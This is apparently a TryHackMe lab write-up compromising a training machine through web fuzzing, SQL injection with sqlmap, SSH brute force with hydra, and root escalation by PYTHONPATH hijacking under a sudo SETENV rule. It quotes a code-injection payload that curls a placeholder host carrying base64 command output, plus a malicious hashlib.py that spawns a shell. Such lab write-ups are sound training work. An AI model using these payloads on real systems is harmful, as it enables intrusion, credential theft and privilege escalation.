# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 8000 | http    |



# RECONNAISSANCE
---


![Pasted image 20250515122728.png](../../IMAGES/Pasted%20image%2020250515122728.png)


As we can see, we got a login page, let's try to fuzz before trying any vuln such as sqli or xss:


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.160.42:8000/FUZZ" -ic -c -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.160.42:8000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 856, Words: 43, Lines: 26, Duration: 338ms]
register                [Status: 200, Size: 964, Words: 51, Lines: 27, Duration: 886ms]
logout                  [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 190ms]
```

Seems like nothing important can be found, let's proceed to the login page then.

![Pasted image 20250515123053.png](../../IMAGES/Pasted%20image%2020250515123053.png)

A good approach is to understand the register process, as we can see, we got to enter the email `id`, this seems weird, let's submit the request to our proxy:

![Pasted image 20250515123302.png](../../IMAGES/Pasted%20image%2020250515123302.png)

I noticed that at the login page, if we use:

```
_
```

We get status code `500`, from a previous machine, I exploited this using a python server to perform:

```python
__import__('os').system('curl http://IP:8000?pwned=$(id|base64)')
```


This time I had no luck, let's proceed to testing `SQLI` and `XSS` then:


![Pasted image 20250515124333.png](../../IMAGES/Pasted%20image%2020250515124333.png)

If we use that, we get:


![Pasted image 20250515124345.png](../../IMAGES/Pasted%20image%2020250515124345.png)


Surprisingly, `SQLI` works, let's proceed to exploitation then.


# EXPLOITATION
---

Knowing that the `username` parameter is vulnerable, let's save the request to a file and use `sqlmap` to check if we can get anything valuable:


```
sqlmap -r "$(pwd)/req.req" --dbs --dump

Database: website
Table: users
[2 entries]
+----+----------------------+----------------+----------+
| id | email                | password       | username |
+----+----------------------+----------------+----------+
| 1  | smokey@email.boop    | My_P@ssW0rd123 | smokey   |
| 2  | test@test.com;whoami | test           | test     |
+----+----------------------+----------------+----------+
```


There we go, we got credentials, let's go into ssh

![Pasted image 20250515125529.png](../../IMAGES/Pasted%20image%2020250515125529.png)


We can begin privilege escalation.



# PRIVILEGE ESCALATION
---


To begin with, let's use `linpeas` so we can check any PE vector:

![Pasted image 20250515133638.png](../../IMAGES/Pasted%20image%2020250515133638.png)

As seen, we got another user named `hazel`, we can also find this:

![Pasted image 20250515133711.png](../../IMAGES/Pasted%20image%2020250515133711.png)

This task runs as `smokey` so we cannot get a root shell with that, if we check inside of `hazel` home, we can find this:

```
smokey@ip-10-10-160-42:~$ ls -la /home/hazel/
total 32
drwxr-xr-x 3 root  root  4096 Mar  2  2022 .
drwxr-xr-x 5 root  root  4096 May 15 17:18 ..
lrwxrwxrwx 1 root  root     9 Dec  7  2021 .bash_history -> /dev/null
-rw-r--r-- 1 hazel hazel  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 hazel hazel 3771 Feb 25  2020 .bashrc
drwx------ 2 hazel hazel 4096 Dec  7  2021 .cache
-rw-r----- 1 root  hazel  497 Dec  7  2021 hasher.py
-rw-r--r-- 1 hazel hazel  807 Feb 25  2020 .profile
-rw-r----- 1 root  hazel   45 Mar  2  2022 user.txt
-rw------- 1 hazel hazel    0 Dec  7  2021 .viminfo
```

There's a file named `hasher.py`, seems like that could be our way into root, since we need `hazel` credentials and there seems to be no backup or anything that reveals us this user's password, let's try brute force:

```
hydra -l hazel -P /usr/share/wordlists/rockyou.txt IP ssh -t 4
```

![Pasted image 20250515135342.png](../../IMAGES/Pasted%20image%2020250515135342.png)

After a while we get:

```
hazel:hazel
```

Seems like the user was the password, let's go into ssh with those credentials then:

![Pasted image 20250515134533.png](../../IMAGES/Pasted%20image%2020250515134533.png)

We can now read the user flag:

```
hazel@ip-10-10-160-42:~$ cat user.txt
THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}
```

If we check our sudo privileges, we can notice this:

```bash
hazel@ip-10-10-160-42:~$ sudo -l
Matching Defaults entries for hazel on ip-10-10-160-42:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on ip-10-10-160-42:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py


hazel@ip-10-10-160-42:~$ ls -l hasher.py
-rw-r----- 1 root hazel 497 Dec  7  2021 hasher.py
```

Let's check the code for the script:

```python
import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()
```

We cannot write on the file so we need to exploit it using the `SETENV` tag, this tag allows us to set environment variables on the sudo command line, if we are able to hijack the `PYTHONPATH` we will get a shell as root, TheÂ `PYTHONPATH`environment variableÂ controls where Python looks for modules. When Python imports a module likeÂ `hashlib`, it searches for the module in the following order:

- Current directory
- Directories in theÂ `PYTHONPATH`Â environment variable
- Standard library directories
- Site-packages directories

Understanding the flow, we can follow these steps to get a root as shell:

1. **Create a maliciousÂ `hashlib.py`Â module**Â that spawns a shell when imported:

```bash
echo 'import os; os.system("/bin/bash")' > /tmp/hashlib.py
```

2. **Execute theÂ `hasher.py`Â script with sudo**, hijacking theÂ `PYTHONPATH`Â environment variable to includeÂ `/tmp`. 

```python
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

If we do this, we can see:

![Pasted image 20250515135207.png](../../IMAGES/Pasted%20image%2020250515135207.png)

As seen, we get a root as shell and can now read `root.txt`:

```
root@ip-10-10-160-42:/home/hazel# cat /root/root.txt
THM{PytH0n_LiBr@RY_H1j@acKIn6}
```

![Pasted image 20250515135418.png](../../IMAGES/Pasted%20image%2020250515135418.png)

